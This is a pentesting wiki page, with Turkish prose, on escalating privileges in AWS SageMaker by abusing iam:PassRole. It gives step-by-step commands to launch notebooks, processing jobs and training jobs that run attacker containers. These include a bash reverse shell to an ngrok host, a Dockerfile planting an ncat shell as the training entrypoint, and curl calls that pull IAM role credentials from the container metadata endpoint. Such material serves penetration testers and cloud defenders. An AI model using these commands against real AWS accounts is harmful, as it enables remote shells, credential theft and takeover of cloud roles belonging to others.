# AWS - Sagemaker Privesc

## AWS - Sagemaker Privesc

{{#include ../../../banners/hacktricks-training.md}}

### `iam:PassRole` , `sagemaker:CreateNotebookInstance`, `sagemaker:CreatePresignedNotebookInstanceUrl`

IAM Rolü ile ilişkilendirilmiş bir not defteri oluşturmaya başlayın:
```bash
aws sagemaker create-notebook-instance --notebook-instance-name example \
--instance-type ml.t2.medium \
--role-arn arn:aws:iam::<account-id>:role/service-role/<role-name>
```
Yanıt, yeni oluşturulan not defteri örneğinin ARN'sini içerecek olan `NotebookInstanceArn` alanını içermelidir. Ardından, not defteri örneğine erişmek için hazır olduğunda kullanabileceğimiz bir URL oluşturmak için `create-presigned-notebook-instance-url` API'sini kullanabiliriz:
```bash
aws sagemaker create-presigned-notebook-instance-url \
--notebook-instance-name <name>
```
Tarayıcı ile URL'ye gidin ve sağ üstteki \`Open JupyterLab\`\` butonuna tıklayın, ardından “Launcher” sekmesine kaydırın ve “Other” bölümünde “Terminal” butonuna tıklayın.

Artık IAM Rolünün metadata kimlik bilgilerine erişmek mümkündür.

**Potansiyel Etki:** Belirtilen sagemaker hizmet rolüne privesc.

### `sagemaker:CreatePresignedNotebookInstanceUrl`

Eğer üzerinde Jupyter **notebook'ları zaten çalışıyorsa** ve bunları `sagemaker:ListNotebookInstances` ile listeleyebiliyorsanız (veya başka bir şekilde keşfedebiliyorsanız). Onlar için **bir URL oluşturabilir, erişebilir ve önceki teknikte belirtildiği gibi kimlik bilgilerini çalabilirsiniz**.
```bash
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name <name>
```
**Potansiyel Etki:** Sagemaker hizmet rolüne privesc.

### `sagemaker:CreateProcessingJob,iam:PassRole`

Bu izinlere sahip bir saldırgan, **sagemaker'ın bir processingjob** çalıştırmasını sağlayabilir. Saldırgan, **AWS yönetimli ECS hesap örneğinde** çalıştırılacak konteynerin tanımını belirtebilir ve **ilişkili IAM rolünün kimlik bilgilerini çalabilir**.
```bash
# I uploaded a python docker image to the ECR
aws sagemaker create-processing-job \
--processing-job-name privescjob \
--processing-resources '{"ClusterConfig": {"InstanceCount": 1,"InstanceType": "ml.t3.medium","VolumeSizeInGB": 50}}' \
--app-specification "{\"ImageUri\":\"<id>.dkr.ecr.eu-west-1.amazonaws.com/python\",\"ContainerEntrypoint\":[\"sh\", \"-c\"],\"ContainerArguments\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14920 0>&1\\\"\"]}" \
--role-arn <sagemaker-arn-role>

# In my tests it took 10min to receive the shell
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" #To get the creds
```
**Potansiyel Etki:** Belirtilen sagemaker hizmet rolüne privesc.

### `sagemaker:CreateTrainingJob`, `iam:PassRole`

Bu izinlere sahip bir saldırgan, bir eğitim işi oluşturabilecek, **üzerinde rastgele bir konteyner çalıştırarak** ona **bir rol ekleyebilecektir**. Bu nedenle, saldırgan rolün kimlik bilgilerini çalabilecektir.

> [!WARNING]
> Bu senaryo, önceki senaryoya göre daha zor bir şekilde istismar edilebilir çünkü bir Docker görüntüsü oluşturmanız gerekiyor ve bu görüntü rev shell veya kimlik bilgilerini doğrudan saldırgana göndermelidir (eğitim işinin yapılandırmasında bir başlangıç komutu belirtemezsiniz).
>
> ```bash
> # Docker görüntüsü oluştur
> mkdir /tmp/rev
> ## Eğitim işinin "train" adlı bir çalıştırılabilir dosyayı çağıracağını unutmayın
> ## Bu yüzden rev shell'i /bin/train içine koyuyorum
> ## <YOUR-IP-OR-DOMAIN> ve <YOUR-PORT> değerlerini ayarlayın
> cat > /tmp/rev/Dockerfile <<EOF
> FROM ubuntu
> RUN apt update && apt install -y ncat curl
> RUN printf '#!/bin/bash\nncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh' > /bin/train
> RUN chmod +x /bin/train
> CMD ncat <YOUR-IP-OR-DOMAIN> <YOUR-PORT> -e /bin/sh
> EOF
>
> cd /tmp/rev
> sudo docker build . -t reverseshell
>
> # ECR'ye yükle
> sudo docker login -u AWS -p $(aws ecr get-login-password --region <region>) <id>.dkr.ecr.<region>.amazonaws.com/<repo>
> sudo docker tag reverseshell:latest <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
> sudo docker push <account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell:latest
> ```
```bash
# Create trainning job with the docker image created
aws sagemaker create-training-job \
--training-job-name privescjob \
--resource-config '{"InstanceCount": 1,"InstanceType": "ml.m4.4xlarge","VolumeSizeInGB": 50}' \
--algorithm-specification '{"TrainingImage":"<account_id>.dkr.ecr.<region>.amazonaws.com/reverseshell", "TrainingInputMode": "Pipe"}' \
--role-arn <role-arn> \
--output-data-config '{"S3OutputPath": "s3://<bucket>"}' \
--stopping-condition '{"MaxRuntimeInSeconds": 600}'

#To get the creds
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
## Creds env var value example:/v2/credentials/proxy-f00b92a68b7de043f800bd0cca4d3f84517a19c52b3dd1a54a37c1eca040af38-customer
```
**Potansiyel Etki:** Belirtilen sagemaker hizmet rolüne privesc.

### `sagemaker:CreateHyperParameterTuningJob`, `iam:PassRole`

Bu izinlere sahip bir saldırgan, **bir hiperparametre eğitim işi** oluşturma yeteneğine (potansiyel olarak) sahip olacak ve bunun üzerinde **bağlı bir rol ile** **rastgele bir konteyner** çalıştırabilecektir.\
_Zaman eksikliğinden dolayı bunu istismar etmedim, ancak önceki istismarlarla benzer görünüyor, istismar detaylarıyla bir PR göndermekten çekinmeyin._

## Referanslar

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}
